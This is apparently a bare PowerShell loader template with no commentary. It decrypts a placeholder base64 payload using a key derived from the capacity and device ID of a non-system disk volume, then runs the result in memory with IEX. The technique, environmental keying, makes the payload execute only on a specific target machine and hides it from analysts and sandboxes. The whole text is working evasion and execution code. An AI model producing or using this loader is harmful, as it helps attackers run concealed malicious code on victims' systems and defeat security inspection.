Function Decrypt($Cipher,$Password,$SALT)
{
	[Byte[]] $SALT = [Text.Encoding]::UTF8.GetBytes($SALT)
	$pDB = New-Object Security.Cryptography.Rfc2898DeriveBytes ($Password,$SALT)
	$RM = New-Object Security.Cryptography.RijndaelManaged
	$RM.Key = $pDB.GetBytes(32)
	$RM.IV = $pDB.GetBytes(16)
	$MemoryStream = New-Object IO.MemoryStream
	$CryptoStream = New-Object Security.Cryptography.CryptoStream $MemoryStream, $RM.CreateDecryptor(), 'Write'
	$CryptoStream.Write($Cipher, 0, $Cipher.Length)
	$CryptoStream.Close()
	return $MemoryStream.ToArray()
}

$Cipher = [Convert]::FromBase64String("#CIPHER#")

$Volumes = Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE DriveLetter != '$env:HOMEDRIVE'"

for ($i=0; $i -lt $Volumes.Length; $i++) {
	$Volumes[$i].DeviceID = $Volumes[$i].DeviceID.Trim("\?Volume{}")
}

foreach ($Volume in $Volumes)
{
	try
	{
		$Plain = Decrypt $Cipher $Volume.Capacity $Volume.DeviceID
	}
	catch {}
	if ($Plain)
	{
		$Plain = [Text.Encoding]::UTF8.GetString($Plain)
		IEX $Plain
		break
	}
}